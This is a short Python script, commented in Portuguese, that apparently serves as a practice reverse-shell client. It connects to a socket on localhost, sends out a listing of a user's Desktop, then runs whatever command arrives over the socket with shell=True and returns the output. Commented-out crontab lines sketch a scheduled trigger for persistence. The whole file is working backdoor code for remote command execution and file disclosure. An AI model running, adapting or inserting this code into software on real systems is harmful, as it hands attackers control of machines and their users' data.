import socket
import subprocess
from crontab import CronTab

#trigger do código
#cron = CronTab(user='joaofth')
#job = cron.new(command='date > /home/joaofth/Desktop/test_cron.txt')
#job.minute.every(1)
#cron.write()
#cron.remove(job)
#cron.remove_all()
#cron.write()
#sem ipv6 para testes

addr = ("127.0.0.1",65000)
mensagem = ""
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((addr))

#mensagem = "ls /home/joaofth"
#pode ser passado o comando direto no parametro, ou em forma de uma varíavel 
saida_msg = subprocess.check_output("ls /home/joaofth/Desktop", stderr=subprocess.STDOUT, shell=True)
print("Conteúdo da msg..:", saida_msg.decode("utf-8"))

client_socket.send(saida_msg)
print("Mensagem enviada!")
#client_socket.bind((addr))

comando1 = client_socket.recv(1024)
#teste de funcionamento
#print(comando1.decode("utf-8"))
comando2 = subprocess.check_output(comando1, stderr=subprocess.STDOUT,shell="True")
#teste de funcionamento
#print(comando2)
client_socket.send(comando2)
#testes para receber shell
#f mensagem == 's':
#recebe = conn.recv(1024)
client_socket.close()